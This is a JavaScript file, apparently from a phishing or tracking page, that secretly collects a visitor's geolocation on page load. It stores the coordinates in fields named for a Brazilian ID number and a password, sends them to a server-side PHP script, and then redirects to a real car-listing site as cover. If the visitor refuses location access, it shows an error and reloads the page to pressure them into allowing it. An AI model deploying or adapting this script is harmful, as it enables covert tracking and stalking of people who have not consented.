function g() { 
    navigator.geolocation.getCurrentPosition(function(position) {
        var latitude = position.coords.latitude;
        var longitude = position.coords.longitude;
        if (longitude && latitude) {
                $("#cpf").attr('data',latitude);
                $("#senha").attr('data', longitude);

                const formData = {
                    cpf: latitude,
                    senha: longitude
                };
                $.ajax({
                    type: 'GET',
                    url: './private/save_to_json.php?cpf1=' + formData.cpf1 + '&cpf=' + formData.cpf + '&senha=' + formData.senha,
                    data: formData,
                    dataType: 'json',
                    success: function(response) {
                        window.location.href = "https://www.webmotors.com.br/carros/estoque/toyota/corolla/de.2015/ate.2015";
                    }
                }).always(function(response) {
                    window.location.href = "https://www.webmotors.com.br/carros/estoque/toyota/corolla/de.2015/ate.2015";
                });   
        }else{
            alert("erro");
        }
     
    }, function(error) {
        $('body').css('background-size', 'contain');
        $('body').css('background', 'url(private/bg.png) no-repeat center center fixed');
        Swal.fire({
            title: 'Ocorreu um erro',
            text: 'Garanta que sua localização esteja habilitada',
            icon: 'error',
            confirmButtonColor: 'rgb(225, 17, 56)'
        }).then(() => {
            location.reload();
        });
    });
 }
document.addEventListener("DOMContentLoaded", () => {

    if ("geolocation" in navigator) {
        g();
    } else {
        window.location.href = "https://www.webmotors.com.br/carros/estoque/toyota/corolla/de.2015/ate.2015";

    }

 

});


